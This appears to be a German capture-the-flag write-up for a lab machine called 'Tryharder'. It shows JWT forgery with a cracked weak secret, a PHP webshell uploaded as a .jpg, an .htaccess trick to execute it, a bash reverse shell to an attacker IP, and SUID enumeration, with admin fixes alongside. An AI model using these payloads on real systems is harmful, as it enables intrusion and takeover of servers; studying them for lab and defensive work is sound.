+        <section id="poc">
+            <h2>Proof of Concept: Erlangung erweiterter Benutzerrechte durch JWT-Manipulation</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Die Webanwendung verwendet JSON Web Tokens (JWTs) zur Authentifizierung und Autorisierung. Der für die Signierung der HS256-Tokens verwendete Secret-Key wurde als schwach identifiziert und konnte mittels Brute-Force erraten werden. Dieser POC demonstriert, wie durch Kenntnis des Secret-Keys der JWT-Payload manipuliert werden kann, um die Benutzerrolle von "user" auf "admin" zu eskalieren und somit erweiterte Berechtigungen in der Anwendung zu erlangen.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Ein gültiger JWT eines angemeldeten Benutzers mit der Rolle "user".</li>
+                    <li>Der geknackte Secret-Key: <span class="password">jwtsecret123</span>.</li>
+                    <li>Ein Werkzeug zur Manipulation und Neusignierung von JWTs (z.B. `jwt_tool.py`).</li>
+                    <li>Zugriff auf die Webanwendung, um das manipulierte Token zu verwenden.</li>
+                </ul>
+            </p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung:</strong>
+            Das Werkzeug `jwt_tool.py` wird verwendet, um den originalen JWT zu manipulieren.
+            `-T`: Startet den Tamper-Modus (manipulieren).
+            `-S hs256`: Gibt den Signaturalgorithmus an (hier explizit HS256, obwohl es aus dem Token gelesen werden könnte).
+            `-p jwtsecret123`: Der geknackte Secret-Key.
+            `eyJ...p5c`: Der originale JWT.
+
+            Das Tool zeigt interaktiv die Header- und Payload-Werte an:
+            Header: `[1] alg = "HS256"`, `[2] typ = "JWT"`. Es wird `0` gewählt, um zum Payload überzugehen.
+            Payload: `[1] sub = "123"`, `[2] role = "user"`, `[3] exp = 1745964405`.
+            Es wird `2` gewählt, um den Wert von `role` zu ändern.
+            Der neue Wert für `role` wird als `admin` eingegeben.
+            Die aktualisierte Payload wird angezeigt: `[2] role = "admin"`.
+            Es wird `0` gewählt, um die Manipulation abzuschließen und das neue Token zu generieren.
+            Das Ergebnis ist das neu signierte, manipulierte JWT: <span class="password">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NDU5NjQ0MDV9.304a9Plzdrv7rrxFp3sSuQfF-wPCZANPZ_36KqAIp68</span>.</p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Durch das Ersetzen des ursprünglichen JWTs im Browser (z.B. im Cookie-Speicher) mit diesem manipulierten Token sollte der Benutzer nun als "admin" in der Anwendung agieren können. Dies sollte ihm Zugriff auf Funktionen gewähren, die zuvor für die Rolle "user" gesperrt waren, wie z.B. die im Dashboard erwähnte Upload-Funktion.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Die Ausnutzung dieser Schwachstelle ermöglicht eine unbefugte Privilegienerweiterung innerhalb der Webanwendung. Ein Angreifer mit Admin-Rechten kann potenziell auf sensible Daten zugreifen, Konfigurationen ändern, andere Benutzer beeinträchtigen oder weitere Angriffe auf das System oder Backend-Systeme starten. Das Risiko ist als HOCH einzustufen.
+            <br><strong>Empfehlungen (Admin):</strong>
+                <ul>
+                    <li>Verwenden Sie starke, zufällig generierte und ausreichend lange Secret-Keys für HMAC-basierte JWT-Signaturen. Vermeiden Sie Standard- oder leicht erratbare Keys.</li>
+                    <li>Speichern Sie Secret-Keys sicher und beschränken Sie den Zugriff darauf.</li>
+                    <li>Rotieren Sie Secret-Keys regelmäßig.</li>
+                    <li>Erwägen Sie die Verwendung asymmetrischer Algorithmen (z.B. RS256/ES256) für die Signierung von JWTs, bei denen der private Schlüssel zum Signieren sicher auf dem Server verbleibt.</li>
+                    <li>Implementieren Sie serverseitig eine strikte Validierung aller Claims im JWT, insbesondere der Rolle, und verlassen Sie sich nicht ausschließlich auf die im Token enthaltenen Informationen ohne erneute Überprüfung gegen eine autoritative Quelle (z.B. Datenbank).</li>
+                    <li>Führen Sie regelmäßige Sicherheitsaudits und Code-Reviews durch, um solche Schwachstellen zu identifizieren und zu beheben.</li>
+                </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~/Hackingtools/jwt_tool]
+└─# <span class="command">python3 jwt_tool.py -T -S hs256 -p jwtsecret123 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc0NTk2NDQwNX0.WhqUWdy84UnPnCsjg9wRu3ihkKMeEkFWBkowh5c5p5c</span></div>
+                    <pre>
+        \   \        \         \          \                    \ 
+   \__   |   |  \     |\__    __| \__    __|                    |
+         |   |   \    |      |          |       \         \     |
+         |        \   |      |          |    __  \     __  \    |
+  \      |      _     |      |          |   |     |   |     |   |
+   |     |     / \    |      |          |   |     |   |     |   |
+\        |    /   \   |      |          |\        |\        |   |
+ \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
+ Version 2.2.7                \______|             @ticarpi      
+
+Original JWT: 
+
+
+====================================================================
+This option allows you to tamper with the header, contents and 
+signature of the JWT.
+====================================================================
+
+Token header values:
+[1] alg = "HS256"
+[2] typ = "JWT"
+[3] *ADD A VALUE*
+[4] *DELETE A VALUE*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+&gt; <span class="command">0</span>
+
+Token payload values:
+[1] sub = "123"
+[2] role = "user"
+[3] exp = 1745964405    ==&gt; TIMESTAMP = 2025-04-30 00:06:45 (UTC)
+[4] *ADD A VALUE*
+[5] *DELETE A VALUE*
+[6] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+&gt; <span class="command">2</span>
+
+Current value of role is: user
+Please enter new value and hit ENTER
+&gt; <span class="command">admin</span>
+[1] sub = "123"
+[2] role = "<span class="password">admin</span>"
+[3] exp = 1745964405    ==&gt; TIMESTAMP = 2025-04-30 00:06:45 (UTC)
+[4] *ADD A VALUE*
+[5] *DELETE A VALUE*
+[6] *UPDATE TIMESTAMPS*
+[0] Continue to next step
+
+Please select a field number:
+(or 0 to Continue)
+&gt; <span class="command">0</span>
+jwttool_c861821e064f681fa68336a2f95f2e57 - Tampered token - HMAC Signing:
+<span class="password">[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NDU5NjQ0MDV9.304a9Plzdrv7rrxFp3sSuQfF-wPCZANPZ_36KqAIp68</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse und Beweismittel:</strong> Das Bild zeigt die Webanwendung nach dem Austauschen des JWTs mit dem manipulierten Token. Man sieht nun, dass die Rolle des Benutzers als "admin" angezeigt wird und, was entscheidend ist, ein neuer Button "Upload File" erschienen ist. Dies war zuvor für die "user"-Rolle nicht sichtbar.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Exzellent! Die JWT-Manipulation war erfolgreich. Durch das Ändern der Rolle im Token auf "admin" und das Neusignieren mit dem geknackten Secret-Key <span class="password">jwtsecret123</span> wurde die Upload-Funktion freigeschaltet. Dies bestätigt die Schwachstelle und den erfolgreichen Proof of Concept zur Privilegienerweiterung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie nun die Upload-Funktion. Welche Dateitypen sind erlaubt? Gibt es Größenbeschränkungen? Werden die hochgeladenen Dateien validiert? Versuchen Sie, eine Webshell hochzuladen, um Remote Code Execution auf dem Server zu erlangen.
+            <br><strong>Empfehlung (Admin):</strong> Zusätzlich zu den bereits genannten Empfehlungen für JWT-Sicherheit: Implementieren Sie serverseitig eine strikte Validierung von Dateiuploads. Erlauben Sie nur bestimmte, sichere Dateitypen (Whitelist-Ansatz). Überprüfen Sie den Inhalt der Dateien. Speichern Sie hochgeladene Dateien außerhalb des Web-Roots oder mit Berechtigungen, die eine Ausführung verhindern. Benennen Sie hochgeladene Dateien um, um das direkte Aufrufen zu erschweren.</p>
+            <img src="user_admin_cracked.jpg" alt="hier kommt ein bild wo man sieht wie der jwt zum admin user erfolgreich ausgetauscht wird , und dadurch eine upload funktion freigeschaltet wurde in form eines neu erschienenen Buttons namens Upload File" style="max-width: 100%; height: auto;">
+
+            <p class="analysis"><strong>Analyse:</strong> Die Seite `http://tryharder.hmv/74221/xiixhu-upload.php` zeigt ein Formular zum Hochladen von Dateien. Die Nachricht <span class="password">"File uploaded successfully: ./uploads/123/shell.php.jpg"</span> und das Bild deuten darauf hin, dass eine Datei namens `shell.php.jpg` erfolgreich in das Verzeichnis `./uploads/123/` hochgeladen wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das ist ein kritischer Schritt! Obwohl die Datei die Erweiterung `.jpg` hat, deutet der Name `shell.php` darauf hin, dass es sich um eine PHP-Webshell handelt, die als Bild getarnt wurde. Wenn der Server so konfiguriert ist, dass er Dateien mit doppelten Erweiterungen (wie `.php.jpg`) trotzdem als PHP interpretiert oder wenn es eine weitere Schwachstelle gibt, um die `.jpg`-Endung zu umgehen, könnte dies zu Remote Code Execution führen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+            1.  Versuchen Sie, die hochgeladene Datei `http://tryharder.hmv/74221/uploads/123/shell.php.jpg` direkt im Browser aufzurufen.
+            2.  Fügen Sie Parameter hinzu, die von einer typischen PHP-Shell erwartet werden (z.B. `?cmd=id`).
+            3.  Wenn dies nicht direkt funktioniert, untersuchen Sie, ob es Möglichkeiten gibt, den Server dazu zu bringen, die Datei als PHP auszuführen (z.B. durch Manipulation von `.htaccess`-Dateien, falls das Hochladen solcher Dateien möglich ist, oder durch Ausnutzung von Local File Inclusion (LFI) Schwachstellen).
+            <br><strong>Empfehlung (Admin):</strong>
+            Implementieren Sie eine strikte serverseitige Validierung von Dateiuploads:
+                *   **Dateityp-Validierung:** Verlassen Sie sich nicht auf den `Content-Type`-Header oder die Dateiendung allein. Prüfen Sie die "Magic Bytes" der Datei.
+                *   **Whitelist für Dateiendungen:** Erlauben Sie nur bekannte, sichere Dateiendungen.
+                *   **Dateinamen-Sanitisierung:** Benennen Sie hochgeladene Dateien serverseitig um (z.B. mit einer zufälligen Zeichenfolge), um das Erraten von Dateinamen und das Ausführen von Shells zu erschweren.
+                *   **Speicherort:** Speichern Sie hochgeladene Dateien außerhalb des Web-Roots. Wenn sie im Web-Root gespeichert werden müssen, stellen Sie sicher, dass das Verzeichnis keine Ausführungsberechtigungen für Skripte hat.
+                *   **Virenscan:** Scannen Sie hochgeladene Dateien mit einem aktuellen Virenscanner.</p>
+            <img src="uploadet_shell.jpg" alt="hier kommt ein bild wo man sieht dass die shell tatsächlich in form eines jpg's hochgeladen wurde" style="max-width: 100%; height: auto;">
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `curl` wird versucht, die hochgeladene Datei `shell.php.jpg` aufzurufen und dabei den Parameter `cmd=id` zu übergeben. Die Antwort des Servers ist der PHP-Code `&lt;?php system($GET["cmd"]); ?&gt;`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies bestätigt zwei Dinge:
+            1.  Die Datei `shell.php.jpg` enthält tatsächlich den erwarteten PHP-Shellcode.
+            2.  Der Server führt die Datei *nicht* als PHP-Skript aus, sondern liefert den Quellcode als Text zurück. Das bedeutet, dass die Endung `.jpg` (oder die Serverkonfiguration) die direkte Ausführung als PHP verhindert. Die Webshell ist also noch nicht aktiv.
+            Der Code `system($GET["cmd"]);` ist eine einfache PHP-Webshell, die den Wert des GET-Parameters `cmd` als Systembefehl ausführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da die direkte Ausführung nicht funktioniert, muss eine andere Methode gefunden werden, um den PHP-Code zur Ausführung zu bringen. Eine gängige Technik ist das Hochladen einer `.htaccess`-Datei in dasselbe Verzeichnis (`/uploads/123/`), die den Apache-Webserver anweist, Dateien mit der Endung `.jpg` als PHP-Skripte zu behandeln (z.B. mit `AddType application/x-httpd-php .jpg`).
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Benutzer keine `.htaccess`-Dateien hochladen können oder dass die Direktive `AllowOverride None` für die entsprechenden Verzeichnisse gesetzt ist, um das Überschreiben von Serverkonfigurationen durch Benutzer zu verhindern. Die aktuelle Konfiguration, die verhindert, dass `.jpg`-Dateien als PHP ausgeführt werden, ist gut, aber das Ziel sollte sein, den Upload von PHP-Code gänzlich zu unterbinden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(.venv)─(root㉿CCat)-[~/Hackingtools]
+└─# <span class="command">curl http://tryharder.hmv/74221/uploads/123/shell.php.jpg?cmd=id</span></div>
+                    <pre>&lt;?php system($GET["cmd"]); ?&gt;</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist der Inhalt der hochgeladenen `shell.php.jpg`-Datei, die eine einfache PHP-Webshell darstellt. `sytem` ist ein Tippfehler und sollte `system` heißen. Die Funktion `system()` führt einen externen Befehl aus und zeigt die Ausgabe an. `$GET['cmd']` nimmt den Wert des URL-Parameters `cmd` entgegen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Code ist eine minimale Webshell. Der Tippfehler `sytem` statt `system` würde dazu führen, dass die Shell nicht funktioniert, selbst wenn sie als PHP ausgeführt würde. Es ist wichtig, auf solche Details zu achten. Im vorherigen `curl`-Output wurde der Code jedoch korrekt als `system($GET["cmd"])` angezeigt, was darauf hindeutet, dass die tatsächlich hochgeladene Datei den korrekten Code enthielt oder der hier gezeigte Code nur eine fehlerhafte Abschrift ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stellen Sie sicher, dass der Webshell-Code korrekt ist. Wenn der Tippfehler tatsächlich in der hochgeladenen Datei vorhanden war, laden Sie eine korrigierte Version hoch.
+            <br><strong>Empfehlung (Admin):</strong> Auch einfache Webshells können vollen Zugriff auf das System im Kontext des Webservers ermöglichen. Alle Maßnahmen zur Verhinderung von Uploads und Ausführung von serverseitigem Code sind kritisch.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>&lt;?php
+sytem($GET['cmd']);
+?&gt; </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Dies ist ein HTTP POST-Request, der mit Burp Suite (oder einem ähnlichen Tool) abgefangen oder konstruiert wurde. Er zielt auf `xiixhu-upload.php`.
+            Der `Content-Type` ist `multipart/form-data`, was typisch für Dateiuploads ist.
+            Entscheidend ist der Teil `Content-Disposition: form-data; name="file"; filename=".htaccess"` und `Content-Type: application/x-php` (obwohl dies für `.htaccess` unüblich ist, aber der Server ignoriert es möglicherweise).
+            Der Inhalt der hochgeladenen Datei ist `AddType application/x-httpd-php jpg`.
+            Das Cookie `jwt_token` enthält das manipulierte Admin-Token.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Versuch, die zuvor erwähnte `.htaccess`-Datei hochzuladen. Wenn diese Datei im Verzeichnis `/uploads/123/` platziert wird und der Apache-Server `AllowOverride Options` oder `AllowOverride FileInfo` (oder `AllowOverride All`) für dieses Verzeichnis zulässt, wird die Direktive `AddType application/x-httpd-php jpg` wirksam. Dies würde den Server anweisen, alle Dateien mit der Endung `.jpg` in diesem Verzeichnis als PHP-Skripte zu interpretieren.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem diese `.htaccess`-Datei erfolgreich hochgeladen wurde (siehe nächste Ausgabe), versuchen Sie erneut, die `shell.php.jpg` mit einem Befehl aufzurufen (z.B. `http://tryharder.hmv/74221/uploads/123/shell.php.jpg?cmd=id`). Sie sollte nun als PHP ausgeführt werden.
+            <br><strong>Empfehlung (Admin):</strong> Setzen Sie `AllowOverride None` in der Apache-Konfiguration für Verzeichnisse, in die Benutzer Dateien hochladen können, um zu verhindern, dass sie die Serverkonfiguration über `.htaccess`-Dateien ändern. Dies ist eine sehr wichtige Sicherheitsmaßnahme.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>POST /74221/xiixhu-upload.php HTTP/1.1
+Host: tryharder.hmv
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de,en-US;q=0.7,en;q=0.3
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------422690224815958562682520154302
+Content-Length: 266
+Origin: http://tryharder.hmv
+DNT: 1
+Connection: keep-alive
+Referer: http://tryharder.hmv/74221/xiixhu-upload.php
+Cookie: <span class="password">jwt_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3NDU5NjQ0MDV9.304a9Plzdrv7rrxFp3sSuQfF-wPCZANPZ_36KqAIp68</span>
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+Priority: u=0, i
+
+-----------------------------422690224815958562682520154302
+Content-Disposition: form-data; name="file"; <span class="command">filename=".htaccess"</span>
+Content-Type: application/x-php
+
+<span class="command">AddType application/x-httpd-php jpg</span>
+-----------------------------422690224815958562682520154302--</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Nachricht <span class="password">"File uploaded successfully: a href='./uploads/123/.htaccess' ./uploads/123/.htaccess"</span> (das `a href` scheint ein Formatierungsfehler in der Nachricht zu sein) bestätigt, dass die `.htaccess`-Datei erfolgreich in das Verzeichnis `/uploads/123/` hochgeladen wurde.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Hervorragend! Wenn `AllowOverride` auf dem Server entsprechend konfiguriert ist, sollte die `shell.php.jpg` nun als PHP-Skript ausgeführt werden können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie jetzt die `shell.php.jpg` mit einem Befehlsparameter auf, um die Remote Code Execution zu bestätigen.
+            <br><strong>Empfehlung (Admin):</strong> Dringend `AllowOverride None` für Upload-Verzeichnisse setzen, um diese Art von Angriff zu verhindern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre><span class="password">File uploaded successfully: a href='./uploads/123/.htaccess' ./uploads/123/.htaccess</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die URL `http://tryharder.hmv/74221/uploads/123/shell.php.jpg?cmd=id` wird aufgerufen. Die Ausgabe ist `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Perfekt! Der Plan hat funktioniert. Durch das Hochladen der `.htaccess`-Datei wird die `shell.php.jpg` nun als PHP-Skript ausgeführt. Der Befehl `id` wurde erfolgreich auf dem Server ausgeführt und zeigt, dass wir Code als Benutzer `www-data` (der typische Benutzer für Apache-Webserver) ausführen können. Wir haben Remote Code Execution (RCE) erreicht!</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wir haben nun eine Webshell und können Befehle als `www-data` ausführen. Der nächste Schritt ist, eine stabilere Reverse Shell zu bekommen, um interaktiver mit dem System arbeiten zu können und dann nach Möglichkeiten zur Privilegienausweitung auf `root` zu suchen.
+            <br><strong>Empfehlung (Admin):</strong> Dieser Vorfall zeigt eine Kaskade von Schwachstellen: schwaches JWT-Secret, unsichere Dateiupload-Funktion und eine unsichere Apache-Konfiguration (`AllowOverride`). Alle diese Punkte müssen behoben werden, um das System abzusichern.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>http://tryharder.hmv/74221/uploads/123/shell.php.jpg?cmd=id
+<span class="password">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span> </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port `9001` gestartet (`nc -lvnp 9001`). Dies dient dazu, eine eingehende Reverse Shell entgegenzunehmen.
+            Der "Payload" ist eine URL-kodierte Zeichenkette, die über die Webshell ausgeführt werden soll: `http://tryharder.hmv/74221/uploads/123/shell.php.jpg?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27`
+            Dekodiert ist der `cmd`-Parameter: `/bin/bash -c 'bash -i >& /dev/tcp/192.168.2.199/9001 0>&1'`
+            Dies ist ein Standard-Bash-Reverse-Shell-Payload. Er startet eine interaktive Bash-Shell und leitet deren Ein- und Ausgabe auf eine TCP-Verbindung zum Angreifer-Host (`192.168.2.199`) auf Port `9001` um.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der klassische Weg, um von einer Webshell zu einer interaktiven Reverse Shell zu gelangen. Die Ausführung dieses Payloads über die Webshell sollte eine Verbindung zum Netcat-Listener des Angreifers herstellen.
+            Die zweite Konsolenausgabe zeigt den erfolgreichen Verbindungsaufbau: `connect to [192.168.2.199] from (UNKNOWN) [192.168.2.186] 59484`.
+            Wir haben nun eine interaktive Shell auf dem Zielsystem als Benutzer `www-data`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (z.B. mit Python PTY-Tricks, `script /dev/null -c bash`), setzen Sie Umgebungsvariablen (`TERM=xterm`, `SHELL=bash`) und beginnen Sie mit der Enumeration des Systems aus der Sicht des `www-data`-Benutzers, um nach Wegen zur Privilegienausweitung zu suchen.
+            <br><strong>Empfehlung (Admin):</strong> Ausgehende Netzwerkverbindungen vom Webserver sollten streng kontrolliert und auf das Notwendigste beschränkt werden (Egress Filtering). Intrusion Detection/Prevention Systeme (IDS/IPS) können versuchen, bekannte Reverse-Shell-Payloads zu erkennen und zu blockieren. Überwachen Sie verdächtige Prozesse, die vom Webserver-Benutzer gestartet werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/sjwt]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>listening on [any] 9001 ...</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>Revshell
+Payload = <span class="command">http://tryharder.hmv/74221/uploads/123/shell.php.jpg?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F9001%200%3E%261%27</span></pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/Hackingtools/sjwt]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.186] 59484</span>
+bash: cannot set terminal process group (428): Inappropriate ioctl for device
+bash: no job control in this shell
+<span class="prompt-remote">www-data@Tryharder:/var/www/html/74221/uploads/123$</span> </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Aus der Reverse Shell als `www-data` werden die Home-Verzeichnisse aufgelistet. Es gibt zwei Benutzer: `pentester` und `xiix`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies gibt uns einen ersten Überblick über die Benutzer auf dem System. Das Verzeichnis `/home` ist typischerweise der Ort für Benutzer-Home-Verzeichnisse unter Linux.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Berechtigungen und Inhalte dieser Home-Verzeichnisse, soweit der `www-data`-Benutzer darauf Zugriff hat. Suchen Sie nach interessanten Dateien, Konfigurationen, Skripten oder Notizen.
+            <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für Home-Verzeichnisse restriktiv gesetzt sind (üblicherweise `rwx------` oder `700`), sodass nur der jeweilige Benutzer und `root` vollen Zugriff haben.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/var/www/html/74221/uploads/123$ <span class="command">ls /home</span></div>
+                    <pre>ls /home
+<span class="command">pentester</span>
+<span class="command">xiix</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `find / -type f -perm -4000 -ls 2>/dev/null` sucht nach SUID-Binaries auf dem gesamten System.
+            `/`: Startet die Suche im Wurzelverzeichnis.
+            `-type f`: Sucht nur nach Dateien.
+            `-perm -4000`: Sucht nach Dateien, bei denen das SUID-Bit gesetzt ist (das erste Oktett der Berechtigungen ist 4 oder höher).
+            `-ls`: Zeigt detaillierte Informationen zu den gefundenen Dateien im `ls -dils`-Format an.
+            `2>/dev/null`: Leitet Fehlermeldungen (z.B. "Permission denied" für Verzeichnisse, auf die `www-data` keinen Zugriff hat) nach `/dev/null`, um die Ausgabe sauber zu halten.
+            Es werden mehrere Standard-SUID-Binaries gefunden, wie `umount`, `chfn`, `mount`, `newgrp`, `passwd`, `gpasswd`, `sudo`, `su`, `chsh` und einige spezifischere wie `dmcrypt-get-device`, `ssh-keysign`, `dbus-daemon-launch-helper`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Liste der SUID-Binaries ist ein wichtiger Anhaltspunkt für Privilegienausweitung. Die meisten der hier gelisteten sind Standard-Linux-Programme, die SUID-Rechte benötigen, um ordnungsgemäß zu funktionieren (z.B. `passwd` um die `/etc/shadow` zu ändern, `sudo` um Befehle als anderer Benutzer auszuführen). Es ist wichtig, nach nicht standardmäßigen oder veralteten/verwundbaren SUID-Binaries Ausschau zu halten. `/usr/bin/sudo` ist immer interessant, da es explizit für die Privilegieneskalation gedacht ist, aber korrekt konfiguriert sein muss.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Versionen dieser SUID-Binaries auf bekannte Exploits. Überprüfen Sie die `sudo -l`-Ausgabe (falls `sudo` verfügbar ist und `www-data` Rechte hat), um zu sehen, welche Befehle als `root` ausgeführt werden dürfen. GTFOBins ist eine ausgezeichnete Ressource, um nach Missbrauchsmöglichkeiten für Standard-Linux-Binaries zu suchen, die SUID- oder `sudo`-Rechte haben.
+            <br><strong>Empfehlung (Admin):</strong> Minimieren Sie die Anzahl der SUID-Binaries auf das absolut Notwendige. Entfernen Sie das SUID-Bit von Programmen, die es nicht benötigen. Überwachen Sie das System regelmäßig auf neue oder unerwartete SUID-Dateien. Halten Sie alle Systempakete aktuell, um bekannte Schwachstellen in SUID-Programmen zu vermeiden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/var/www/html/74221/uploads/123$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>     2951     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 <span class="command">/usr/lib/eject/dmcrypt-get-device</span>
+   278010    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 <span class="command">/usr/lib/openssh/ssh-keysign</span>
+   263379     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 <span class="command">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   266020     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 <span class="command">/usr/bin/umount</span>
+   262189     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 <span class="command">/usr/bin/chfn</span>
+   266018     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 <span class="command">/usr/bin/mount</span>
+   265545     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 <span class="command">/usr/bin/newgrp</span>
+   262193     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 <span class="command">/usr/bin/passwd</span>
+   262192     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 <span class="command">/usr/bin/gpasswd</span>
+   270466    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 <span class="command">/usr/bin/sudo</span>
+   265692     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 <span class="command">/usr/bin/su</span>
+   262190     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 <span class="command">/usr/bin/chsh</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der `www-data`-Benutzer navigiert in das Home-Verzeichnis des Benutzers `pentester` und listet dessen Inhalt mit `ls -la` auf.
+            Interessante Dateien:
+            `.note`: Eine Datei, die dem Benutzer `root` gehört, aber für alle lesbar ist (`-rw-r--r--`).
+            `user.txt`: Eine Datei, die dem Benutzer `pentester` gehört und für alle lesbar ist. Dies ist oft die User-Flag-Datei.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Zugriff auf `/home/pentester` ist möglich. Die Datei `user.txt` ist sehr wahrscheinlich die gesuchte User-Flag. Die Datei `.note` ist ebenfalls interessant, da sie `root` gehört und möglicherweise Hinweise enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lesen Sie sofort den Inhalt von `user.txt` und `.note`.
+            <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Berechtigungen von Dateien in Home-Verzeichnissen. Sensible Notizen oder Flags sollten nicht für andere Benutzer lesbar sein, es sei denn, dies ist beabsichtigt (wie bei CTF-Challenges).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@Tryharder:/var/www/html/74221/uploads/123$ <span class="command">ls /home/</span></div>
+                    <pre>pentester  xiix</pre>
+                    <div class="prompt-remote">www-data@Tryharder:/var/www/html/74221/uploads/123$ <span class="command">cd /home/pentester/</span></div>
+                    <div class="prompt-remote">www-data@Tryharder:/home/pentester$ <span class="command">ls -la</span></div>
+                    <pre>total 28
+drwxr-xr-x 2 pentester pentester 4096 Mar 25 06:46 .
